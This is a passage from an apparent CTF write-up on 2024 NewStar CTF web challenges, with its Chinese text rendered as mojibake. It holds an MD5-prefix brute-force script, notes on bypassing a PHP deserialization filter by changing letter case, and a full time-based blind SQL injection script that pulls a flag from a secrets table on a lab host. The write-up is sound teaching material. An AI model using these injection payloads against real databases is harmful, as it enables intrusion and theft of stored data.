class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>))  <span class="comment">#å…¶å®ç›¸æ¯”éšæœºæ•°ï¼Œç”¨for in rangeç©·å°½ä¼šæ›´å¥½ï¼Œå› ä¸ºå¯ä»¥æŒ‡å¯¼åˆ¤æ–­æ˜¯å¦èƒ½åœ¨è¿™ä¸ªèŒƒå›´æ‰¾åˆ°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">s</span>) :</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tar=<span class="string">&quot;8031b&quot;</span>   <span class="comment">#å¯»æ‰¾ä»¥8031bä¸ºå¼€å¤´çš„md5çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs=generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] testing on <span class="subst">&#123;strs&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> encode(strs.encode()).startswith(tar) :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found!&quot;</span>,strs)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho12.png" class=""><p>ä¼ å…¥å‚æ•°è·å–ä¿¡æ¯</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho11.png" class=""><p>æ¥ä¸‹æ¥è¿›å…¥æœ€åçš„æŒ‘æˆ˜ï¼ˆçƒ¦æ­»è¿™ä¸ªå¥—å¨ƒäº†ï¼‰</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho13.png" class=""><p>å‚æ•°çš„ä¼ å…¥æ˜¯é€šè¿‡inputä¼ªåè®®ï¼Œåªè¦æŠŠè¦ä¼ å…¥çš„å†…å®¹ç›´æ¥å†™åœ¨postä¸»ä½“å°±å¥½äº†</p><p>è¿™é‡Œéœ€è¦ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„chocolateå¯¹è±¡ï¼Œè™½ç„¶åŠ äº†ä¸€ä¸ªæ­£åˆ™æ£€æµ‹ï¼Œä½†æ˜¯å…¶å®å¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨</p><p>å°±ç®—è§¦å‘é”™è¯¯ï¼Œææ„å‡½æ•°ä»ç„¶ä¼šæ‰§è¡Œï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯</p><p>è€Œä¸”ç»•è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œå¤§å°å†™ç»•è¿‡å°±å¥½</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho15.png" class=""><p>ä¼ å…¥å³å¯å¾—åˆ°æœ€åçš„ä¿¡æ¯</p><p>ä½†æ˜¯æˆ‘æ‰¾äº†åŠå¤©ï¼Œä¹Ÿæ‰¾ä¸åˆ°ç³–åœ¨å“ªï¼Œçœ‹äº†æç¤ºä¹‹åæ‰çŸ¥é“è¿™ä¸ªè¦è‡ªå·±è¯•</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho16.png" class=""><p>éšä¾¿å¡«ä¸€ä¸ªç³–åˆ†</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho17.png" class=""><p>ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°å¡«çš„æ•°å­—ä½äº†ï¼Œå¦‚æœå¡«çš„æ•°å­—å¤ªå¤§ï¼Œä¼šæ˜¾ç¤ºå¤ªç”œäº†</p><p>é‚£å°±å¥½åŠäº†ï¼Œç›´æ¥äºŒåˆ†æ³•æŠŠæ­£ç¡®çš„ç³–åˆ†è¯•å‡ºæ¥ï¼Œæœ€åå‘ç°æ˜¯2042</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho18.png" class=""><h2 id="blindsql2"><a href="#blindsql2" class="headerlink" title="blindsql2"></a>blindsql2</h2><p>è¿™é‡Œç›´æ¥ç»™å‡ºè„šæœ¬äº†ï¼Œä¸å‰é¢çš„blindsql1çš„è¿‡æ»¤æƒ…å†µæ˜¯ä¸€æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç›²æ³¨è„šæœ¬æ¨¡æ¿ï¼Œå¯ç”¨äºå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"><span class="keyword">from</span> retry <span class="keyword">import</span> retry</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.43.76:1405/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æœ‰æ—¶å€™ä¼šå‘ç”Ÿè¿æ¥é”™è¯¯ï¼Œéœ€è¦é‡è¯•</span></span><br><span class="line"><span class="meta">@retry(<span class="params">tries=<span class="number">3</span>,delay=<span class="number">1</span></span>)   </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">injection</span>(<span class="params">url,params</span>):</span><br><span class="line">    res = requests.get(url, params)</span><br><span class="line">    <span class="keyword">return</span> res.elapsed.total_seconds()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_param</span>(<span class="params">position,char_to_be_tried</span>):</span><br><span class="line"> <span class="comment"># æ¨¡æ¿è¯­å¥ï¼Œé‡‡ç”¨æ‹¬å·ç»•è¿‡</span></span><br><span class="line">    tables = <span class="string">f&#x27;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\&#x27;flag%\&#x27;)))&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–æ‰€æœ‰è¡¨åçš„ç¬¬positionä¸ªå­—ç¬¦ï¼Œå¹¶è®¡ç®— ascii å€¼</span></span><br><span class="line">    char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;position&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># çˆ†ç ´è¯¥ ascii å€¼</span></span><br><span class="line">    b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(char_to_be_tried)&#125;</span>))&#x27;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># è‹¥ ascii çŒœå¯¹äº†ï¼Œåˆ™ and åé¢çš„ç»“æœ(å³bçš„å€¼)æ˜¯ true</span></span><br><span class="line">    p = <span class="string">f&#x27;Alice\&#x27;and(if(<span class="subst">&#123;b&#125;</span>,sleep(1.5),0))#&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + <span class="string">&#x27;,_-&#123;&#125;@&#x27;</span> + string.digits :</span><br><span class="line">        time.sleep(<span class="number">0.01</span>) <span class="comment"># é™åˆ¶é€Ÿç‡ï¼Œé˜²æ­¢è¯·æ±‚è¿‡å¿«</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        p=get_param(i,c)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;</span><br><span class="line"></span><br><span class="line">        respond_time = injection(url,params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> respond_time &gt; <span class="number">1.5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(respond_time)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å½“å‰ä½ç½®ç¼ºå¤±ï¼Œå¯èƒ½æ˜¯å­—ç¬¦é›†ä¸å®Œæ•´</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Lack&#x27;</span>)</span><br><span class="line">        result += <span class="string">f&#x27;&lt;<span class="subst">&#123;i&#125;</span>&gt;&#x27;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
